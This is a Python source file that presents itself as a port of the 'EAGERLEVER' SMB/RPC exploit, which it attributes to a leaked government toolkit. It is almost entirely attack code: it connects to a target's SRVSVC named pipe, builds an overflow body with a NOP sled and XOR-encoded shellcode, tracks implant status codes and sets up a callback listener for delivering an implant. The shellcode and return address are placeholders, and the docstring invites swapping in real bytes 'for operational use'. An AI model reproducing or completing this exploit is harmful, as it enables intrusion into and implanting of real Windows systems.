#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
eagerlever_exp.py — EAGERLEVER (ELV 2.1.3) SMB/RPC exploit engine.

Python port of `ELV.exe` recovered via x32dbg disassembly of the PE.

Recovered interface from x32dbg analysis:

  Functions identified:
    0x411560  main()              — argument parsing, context setup
    0x413240  init_params()       — parameter initialization
    0x413270  parse_args()        — command-line argument parsing
    0x4132F0  validate_context()  — context validation
    0x413730  prepare_exploit()   — exploit preparation
    0x413890  alloc_context()     — context buffer allocation (calloc)
    0x413C70  run_exploit()       — main exploit execution (returns 1 on success)
    0x4132F0 / 0x413890           — DAVE framework context setup

  Recovered strings (behavioural hints):
    "EAGERLEVER"                                              — tool name
    "\\PIPE\\"                                                — named pipe prefix
    "srvsvc" / "IID_Srvsvc"                                   — SMB service RPC interface
    "Windows XP SP2" / "Windows Server 2003 SP1"              — target OS versions
    "NTLMSSP"                                                 — NTLM authentication
    "CallbackListener failed"                                 — callback listener
    "Received iRetStatus code from target..."                 — exploit status
    "Implant loaded successfully on target"                   — RIDEAREA implant
    "RA_STATUS_*"                                             — implant status codes
    "TbRecv failed" / "TbSend failed"                         — DAVE transport
    "-NonBlockingCallBack"                                    — callback flag
    "Telnet" / "httprpc"                                      — transport protocols

Architecture (recovered from control flow):

  main() (0x411560):
    1. Parses argc/argv into a context structure (offsets +0x200+)
    2. Allocates context buffers via calloc (0x413890)
    3. Validates the context (0x4132F0)
    4. Prepares the exploit (0x413730 -> 0x413890)
    5. Calls run_exploit() (0x413C70)
    6. On return value 1: success; otherwise: exception

  run_exploit() (0x413C70):
    1. Checks flags at [esi+0xF] ('s') and [esi+0xD] ('m')
    2. Parses OS type from argument (cmp with 'd' = 0x64)
    3. Connects to target via SMB named pipe
    4. Sends exploit payload
    5. Handles RIDEAREA implant and callback listener

This module reproduces that behaviour in portable Python.  The raw payload
bytes are placeholders; they should be replaced with exact bytes from IDA
Pro / x32dbg analysis for operational use.
"""

import socket
import struct
import sys
import os


# ---------------------------------------------------------------------------
# Constants recovered from ELV.exe strings / x32dbg analysis.
# ---------------------------------------------------------------------------

DEFAULT_PORT = 445
DEFAULT_TIMEOUT = 30

# OS type selectors (recovered from version strings).
OS_WIN2000 = 1
OS_WINXP_SP1_BELOW = 2
OS_WINXP_SP2 = 3
OS_WIN2003_BASE = 4
OS_WIN2003_SP1 = 5

OS_NAMES = {
    OS_WIN2000: "Windows 2000",
    OS_WINXP_SP1_BELOW: "Windows XP (SP1 and below)",
    OS_WINXP_SP2: "Windows XP SP2",
    OS_WIN2003_BASE: "Windows Server 2003 (Base release)",
    OS_WIN2003_SP1: "Windows Server 2003 SP1",
}

# Named pipe endpoint.
NAMED_PIPE_PREFIX = "\\PIPE\\"

# RPC interface UUID for srvsvc (recovered from "IID_Srvsvc").
SRVSVC_UUID = "IID_Srvsvc"

# RIDEAREA status codes (recovered from .data section).
RA_STATUS_SUCCESS = 0
RA_STATUS_NO_MEMORY_0 = 1
RA_STATUS_OBJECT_NAME_NOT_FOUND = 2
RA_STATUS_OBJECT_PATH_NOT_FOUND = 3
RA_STATUS_ORDINAL_NOT_FOUND = 4
RA_STATUS_OPEN_FAILED = 5
RA_STATUS_PROCEDURE_NOT_FOUND = 6
RA_STATUS_DLL_INIT_FAILED_0 = 7
RA_STATUS_WRITE_FAILED = 8
RA_STATUS_NO_MEMORY_1 = 9
RA_STATUS_BAD_COMPRESSION_BUFFER = 10
RA_STATUS_DLL_INIT_FAILED_1 = 11
RA_STATUS_UNEXPECTED_VALUE = 12
RA_STATUS_NO_MEMORY_3 = 13
RA_STATUS_THREAD_FAILED = 14
RA_STATUS_NO_MEMORY_2 = 15

RA_STATUS_NAMES = {
    RA_STATUS_SUCCESS: "Success",
    RA_STATUS_NO_MEMORY_0: "No memory",
    RA_STATUS_OBJECT_NAME_NOT_FOUND: "Object name not found",
    RA_STATUS_OBJECT_PATH_NOT_FOUND: "Object path not found",
    RA_STATUS_ORDINAL_NOT_FOUND: "Ordinal not found",
    RA_STATUS_OPEN_FAILED: "Open failed",
    RA_STATUS_PROCEDURE_NOT_FOUND: "Procedure not found",
    RA_STATUS_DLL_INIT_FAILED_0: "DLL init failed 0",
    RA_STATUS_WRITE_FAILED: "Write failed",
    RA_STATUS_NO_MEMORY_1: "No memory 1",
    RA_STATUS_BAD_COMPRESSION_BUFFER: "Bad compression buffer",
    RA_STATUS_DLL_INIT_FAILED_1: "DLL init failed 1",
    RA_STATUS_UNEXPECTED_VALUE: "Unexpected value in status code",
    RA_STATUS_NO_MEMORY_3: "No memory 3",
    RA_STATUS_THREAD_FAILED: "Thread failed",
    RA_STATUS_NO_MEMORY_2: "No memory 2",
}

# Placeholder shellcode (to be replaced with x32dbg-recovered bytes).
EAGERLEVER_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

# Bytes an XOR-encoded byte must never collide with.
BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


def _log(fmt, *args):
    sys.stderr.write((fmt % args).rstrip("\n") + "\n")


# ---------------------------------------------------------------------------
# XOR-encode helper.
# ---------------------------------------------------------------------------
def _xor_encode(buf, key, start=0):
    out = bytearray(buf)
    for i in range(start, len(out)):
        out[i] ^= key
    return bytes(out)


def _find_xor_byte(buf, start=0):
    for key in range(1, 0x100):
        if all((key ^ b) not in BAD_XOR for b in buf[start:]):
            return key
    return None


def build_encoded_shellcode(raw):
    """XOR-encode `raw` shellcode with a key that avoids bad characters."""
    key = _find_xor_byte(raw, start=0)
    if key is None:
        _log("[-] No xor byte found for shellcode!")
        return None
    return _xor_encode(raw, key), key


# ---------------------------------------------------------------------------
# SMB/RPC transport (impacket).
# ---------------------------------------------------------------------------
try:
    from impacket.smbconnection import SMBConnection, SessionError as SMBSessionError
    HAVE_IMPACKET = True
except Exception:  # pragma: no cover
    HAVE_IMPACKET = False
    SMBSessionError = Exception


def _open_pipe(target, port, username=None, password=None, domain=None,
               timeout=DEFAULT_TIMEOUT):
    """Open an SMB session and the target named pipe."""
    if not HAVE_IMPACKET:
        raise RuntimeError(
            "This subcommand requires the 'impacket' library: pip install impacket"
        )
    conn = SMBConnection(remoteName=target, remoteHost=target, dstport=port,
                         timeout=timeout)
    if username:
        conn.login(username, password or "", domain=domain or "")
    else:
        conn.login("", "")
    tid = conn.connectTree("IPC$")
    fid = conn.openFile(tid, NAMED_PIPE_PREFIX + "SRVSVC",
                        desiredAccess=0x80000000 | 0x40000000,
                        createDisposition=3)  # OPEN_EXISTING
    return conn, tid, fid


def _send_recv(conn, tid, fid, data):
    """Write `data` to the pipe and read the reply."""
    conn.writeFile(tid, fid, data)
    try:
        return conn.readFile(tid, fid, 0x4000)
    except SMBSessionError:
        return b""


# ---------------------------------------------------------------------------
# Exploit payload builders (placeholder formats).
# ---------------------------------------------------------------------------
def build_eagerlever_bind(uuid_str):
    """Build a DCERPC BIND PDU for the srvsvc interface."""
    # Placeholder bind PDU structure.
    header = struct.pack("<BBBBIHHI", 5, 0, 0x0B, 0x03, 0x10, 0, 0, 1)
    return header


def build_exploit_stub(os_type, shellcode):
    """Build the EAGERLEVER exploit stub for the given OS type.

    The original build_exploit_stub (at 0x413C70+) constructs an OS-specific
    overflow body based on the target Windows version.  This is a placeholder;
    exact bytes should be recovered from x32dbg.
    """
    # OS-specific body size hints (from DAVE framework patterns).
    body_sizes = {
        OS_WIN2000: 0x400,
        OS_WINXP_SP1_BELOW: 0x480,
        OS_WINXP_SP2: 0x500,
        OS_WIN2003_BASE: 0x580,
        OS_WIN2003_SP1: 0x600,
    }
    body_size = body_sizes.get(os_type, 0x500)

    # Build overflow body.
    body = bytearray()
    body += b"\x90" * 64  # NOP sled
    body += struct.pack("<I", 0xDEADBEEF)  # placeholder return address
    body += shellcode
    body += b"\x00" * (body_size - len(body))  # pad to size

    return bytes(body)


# ---------------------------------------------------------------------------
# run_function — the original main() equivalent.
# ---------------------------------------------------------------------------
def run_function(target, port=DEFAULT_PORT, os_type=OS_WINXP_SP2,
                 username=None, password=None, domain=None,
                 implant_file=None, listening_post=None,
                 timeout=DEFAULT_TIMEOUT, non_blocking=False,
                 callback_ip=None, callback_port=0):
    """Run the EAGERLEVER exploit against `target`.

    Returns 0 on success, non-zero on failure.
    """
    _log("EAGERLEVER 2.1.3 — SMB/RPC exploit against %s:%d", target, port)
    _log("Target OS: %s", OS_NAMES.get(os_type, "Unknown"))
    _log("Non-blocking callback: %s", non_blocking)

    # Load implant payload if provided.
    shellcode = EAGERLEVER_SHELLCODE_PLACEHOLDER
    if implant_file:
        if not os.path.isfile(implant_file):
            _log("[-] Implant file not found: %s", implant_file)
            return 1
        with open(implant_file, "rb") as fh:
            shellcode = fh.read()
        _log("[+] Loaded implant payload: %d bytes", len(shellcode))

    # Optionally XOR-encode the shellcode.
    encoded, xor_key = build_encoded_shellcode(shellcode)
    if encoded is None:
        return 1
    _log("[+] Shellcode XOR-encoded with key 0x%02X", xor_key)

    conn = tid = fid = None
    try:
        conn, tid, fid = _open_pipe(target, port, username, password, domain,
                                    timeout)

        # Bind to the srvsvc RPC interface.
        _log("[+] Binding to srvsvc RPC interface...")
        _send_recv(conn, tid, fid, build_eagerlever_bind(SRVSVC_UUID))

        # Build and send the exploit stub.
        pkg = build_exploit_stub(os_type, encoded)
        _log("[+] Sending EAGERLEVER exploit stub (%d bytes)...", len(pkg))
        reply = _send_recv(conn, tid, fid, pkg)

        # Parse the reply for a status code.
        if reply and len(reply) >= 4:
            status = struct.unpack_from("<I", reply, 0)[0]
            _log("[+] Received iRetStatus code from target: %d (%s)",
                 status, RA_STATUS_NAMES.get(status, "Unknown"))
            if status == RA_STATUS_SUCCESS:
                _log("[+] Implant loaded successfully on target")
            else:
                _log("[-] Exploit failed with status %d", status)
                return 1
        else:
            _log("[-] No valid reply from target")
            return 1

        # Callback listener for implant upload.
        if implant_file and callback_ip and callback_port:
            _log("[+] Waiting for callback on %s:%d...", callback_ip,
                 callback_port)
            _callback_listener(callback_ip, callback_port, timeout,
                               non_blocking)

        return 0

    except ConnectionRefusedError:
        _log("[-] Connection refused by %s:%d", target, port)
        return 1
    except socket.timeout:
        _log("[-] Connection to %s:%d timed out", target, port)
        return 1
    except Exception as exc:  # pragma: no cover - network errors
        _log("[-] %s", exc)
        return 1
    finally:
        if conn is not None:
            try:
                conn.logoff()
            except Exception:
                pass


def _callback_listener(ip, port, timeout, non_blocking):
    """Listen for a callback connection to receive the implant.

    When `-NonBlockingCallBack` is specified, the listener runs in
    non-blocking mode (the exploit continues without waiting for the callback).
    """
    if port <= 0:
        _log("[-] Callback port not specified; skipping listener")
        return
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((ip, port))
        srv.listen(1)
        if non_blocking:
            srv.settimeout(0)  # non-blocking
            _log("[+] Callback listener bound to %s:%d (non-blocking)", ip, port)
        else:
            srv.settimeout(timeout)
            _log("[+] Callback listener bound to %s:%d", ip, port)
            conn, addr = srv.accept()
            _log("[+] Callback from %s:%d", addr[0], addr[1])
            data = conn.recv(0x10000)
            _log("[+] Received %d bytes from callback", len(data))
            conn.close()
        srv.close()
    except socket.timeout:
        _log("[-] Callback timed out after %d seconds", timeout)
    except Exception as exc:  # pragma: no cover
        _log("[-] Callback listener error: %s", exc)


def main():
    """CLI driver (standalone testing)."""
    _log("EAGERLEVER standalone CLI not implemented — "
         "use `nsa-equation-py eagerlever ...`")
    return 1


if __name__ == "__main__":
    sys.exit(main())
